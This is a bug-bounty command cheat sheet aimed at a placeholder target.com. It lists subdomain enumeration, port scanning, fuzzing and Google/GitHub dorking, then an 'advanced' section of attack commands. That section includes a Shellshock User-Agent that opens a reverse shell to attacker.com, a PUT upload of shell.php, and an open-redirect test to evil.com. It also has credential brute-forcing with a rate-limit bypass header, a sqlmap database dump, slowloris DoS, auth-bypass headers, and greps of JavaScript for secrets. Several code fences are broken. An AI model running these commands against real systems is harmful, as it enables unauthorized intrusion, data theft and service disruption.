# 🛡️ Bug Bounty Command Framework

## 🕵️ Subdomain Enumeration

```bash
subfinder -d target.com -o subfinder.txt
shodanx subdomain -d target.com -ra -o shodax.txt
amass enum -active -norecursive -noalts -d target.com -o amass.txt
gobuster dns -d target.com -w /usr/share/wordlists/subdomain_megalist.txt -o gobuster.txt

# CRT.sh
curl -s "https://crt.sh/?q=%.target.com&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u | tee crtsh_subs.txt

# AlienVault OTX
curl -s "https://otx.alienvault.com/api/v1/indicators/hostname/target.com/passive_dns" | jq -r '.passive_dns[]?.hostname' | grep -E "[a-zA-Z0-9.-]+\\.target\\.com" | sort -u | tee alienvault_subs.txt

# URLScan
curl -s "https://urlscan.io/api/v1/search/?q=domain:target.com&size=10000" | jq -r '.results[]?.page?.domain' | grep -E "[a-zA-Z0-9.-]+\\.target\\.com" | sort -u | tee urlscan_subs.txt

# Wayback Machine
curl -s "http://web.archive.org/cdx/search/cdx?url=*.target.com/*&output=json&collapse=urlkey" | jq -r '.[1:][].[2]' | grep -Eo "([a-zA-Z0-9]+\\.)?target.com" | sort -u | tee wayback_subs.txt
```

Combine all subdomain results into a single file: 
```bash
cat *.txt | sort -u > all_subs.txt
```

## 🌐 Live Host Detection

```bash
cat all_subs.txt | httpx -td -title -sc -ip -o httpx_output.txt
cat httpx_output.txt | awk '{print $1}' > live_subs.txt

# Filter for tech stack
cat live_subs.txt | grep -Ei 'asp|php|jsp|jspx|aspx'

# Wide port scan
httpx -l all_subs.txt -ports 80,443,8080,8443,8888,8081,3306,5432,6379,27017,15672,10000,9090,5900 -threads 100 -o alive_ports.txt
```

## 📦 Port Scanning & Service Detection

```bash
naabu -list live_subs.txt -c 50 -o naabu_ports.txt
nmap -sV -sC -iL live_subs.txt -oN nmap_scan.txt --script vuln
```

## 🔍 Vulnerability Scanning

```bash
nikto -h live_subs.txt -output nikto_results.txt

nuclei -l live_subs.txt -rl 10 -bs 2 -c 2 -as -severity critical,high,medium -silent
```

## 👻 Subdomain Takeover

```bash
subzy run --targets live_subs.txt --concurrency 100 --hide_fails --verify_ssl
```

## 🔗 Broken Link Hijacking

```bash
socialhunter -f live_subs.txt
```

## 📸 Screenshotting

```bash
eyewitness --web -f live_subs.txt --threads 5 -d screenshots
```

## 🔥 WAF Detection

```bash
cat httpx_output.txt | grep 403 > waf_enabled.txt
cat httpx_output.txt | grep -vE "cloudflare|imperva|cloudfront" > nowaf_subs.txt
```

## 🎯 Prepare for Fuzzing (403/463 Response Filtering)

```bash
cat nowaf_subs.txt | grep 403 | awk '{print $1}' > 403_subs.txt
```

## 🔨 Fuzzing

### Default Wordlist:

```bash
dirsearch -u https://sub.target.com -x 403,404,500,400,502,503,429 --random-agent
```

### Extension-Based:

```bash
dirsearch -u https://sub.target.com -e xml,json,sql,db,log,yml,yaml,bak,txt,tar.gz,zip -x 403,404,500,400,502,503,429 --random-agent
```

## 📜 JavaScript Analysis

```bash
grep -Eo "https?:\\/\\/[a-zA-Z0-9./?=_-]*\\.js" index.html | sort -u
```

### Tools:

* LinkFinder
* JSParser
* SecretFinder

## 🔎 Google Dorking

```bash
site:target.com inurl:folder
site:target.com inurl:open
site:target.com filetype:pdf
site:target.com filetype:docx
site:target.com filetype:pptx
site:target.com filetype:xlsx
site:target.com inurl:/docs/
site:target.com inurl:/files/
site:target.com "confidential"

# Google Drive & Docs
site:drive.google.com inurl:folder
site:docs.google.com inurl:document
site:drive.google.com "confidential"
```

## 🔥 Advanced Bug Bounty Commands by Category
### 1. 🧠 JavaScript Recon & Secret Discovery
Download JS Files
```bash
cat live_subs.txt | hakrawler -js -depth 2 -insecure | tee js_urls.txt
```
Parse Secrets from JS
```bash
cat js_urls.txt | waybackurls | grep -iE "\.js$" | sort -u | while read url; do curl -s "$url" | grep -E -i "apikey|token|secret|password|bearer|authorization" && echo "$url"; done
```
Automated JS Secret Detection
```bash
gospider -S live_subs.txt -t 10 -d 3 -c 10 --js | gf interesting | tee gospider_js.txt
secretfinder -i jsfile.js -o cli
2. 🚪 SSRF & Open Redirects Detection
```
SSRF Payload Injection Test
```bash
interactsh-client
# Replace params manually in Burp or use:
ffuf -u https://target.com/page?url=http://FUZZ -w interactsh.txt
```
Open Redirect Detection
```bash
waybackurls target.com | gf redirect | qsreplace "https://evil.com" | while read url; do curl -s -L $url -I | grep "Location:"; done
3. ⚙️ Parameter Discovery & Bypasses
```
Param Discovery
```bash
gau target.com | gf params | tee params.txt
```
Param Mining with Arjun
```bash
arjun -u https://target.com/index.php -m GET
```
Bypass HTTP Methods
```bash
curl -X TRACE https://target.com
curl -X PUT https://target.com/shell.php --data-binary @shell.php
4. 🐚 RCE / LFI / SSTI Testing
```
Local File Inclusion (LFI) Test
```bash
ffuf -u https://target.com/page=FUZZ -w /usr/share/wordlists/lfi.txt
```
SSTI Test in Burp or via qsreplace
```bash
cat params.txt | qsreplace "{{7*7}}" | while read url; do curl -s $url | grep 49 && echo "$url vulnerable"; done
```
RCE via Headers
```bash
curl -H "User-Agent: () { :;}; echo; bash -i >& /dev/tcp/attacker.com/4444 0>&1" https://target.com
5. 💥 SQL Injection & XSS Testing
```
SQLMap Automated Scan
```bash
sqlmap -u "https://target.com/page.php?id=1" --batch --level=5 --risk=3 --dump
```
XSS Reflected Auto Test
```bash
dalfox file params.txt --custom-payload xss_payloads.txt --silence
```
XSS in Headers
```bash
curl -H "Referer: <script>alert(1)</script>" https://target.com
6. 🔐 Authentication, JWT & IDOR
```
JWT Decode & Tamper
```bash
echo <token> | jwt -d -k "secret"
```
Brute-force hidden IDs
```bash
ffuf -u https://target.com/user?id=FUZZ -w numbers.txt -mc 200
```
Auth Bypass with Headers
```bash
curl -H "X-Original-URL: /admin" https://target.com
curl -H "X-Custom-IP-Authorization: 127.0.0.1" https://target.com
7. 🧨 Rate Limiting & DoS Testing
```
Rate Limit Bypass with Header Rotation
```bash
ffuf -u https://target.com/login -w users.txt:USER -w passwords.txt:PASS -H 'X-Forwarded-For: 127.0.0.1' -d 'username=USER&password=PASS' -X POST
```
Slow POST DoS
```bash
slowloris https://target.com
8. 🔍 404 Bypass / Hidden Endpoints
```
Common 403/404 Bypass Payloads
```bash
curl https://target.com/admin/
curl https://target.com/admin/..;/  # bypass
curl https://target.com/admin.%20/
```
Hidden Endpoint Discovery
```bash
ffuf -u https://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -fc 403,404
9. 📂 GitHub & Public Leak Recon
```
GitHub Dorks (via GitHub CLI or manually):
```bash
gh search code --owner target --match content "password"
```
Tool: gitdorks_go
```bash
gitdorks_go -d target.com -t GITHUB_TOKEN
10. 📁 CVE & Known Vuln Check
```
CVE Detection on Web App
```bash
nuclei -u https://target.com -t cves/
```
Dependency CVE Check
```bash
npm audit
yarn audit
retire.js
```

📚 Bonus Recon Tools to Learn
Tool	Use
gau	Get all known URLs of a domain
katana	Fast web crawler
paramspider	Find GET/POST parameters
xnLinkFinder	JS endpoint extraction
interactsh	OOB interaction detection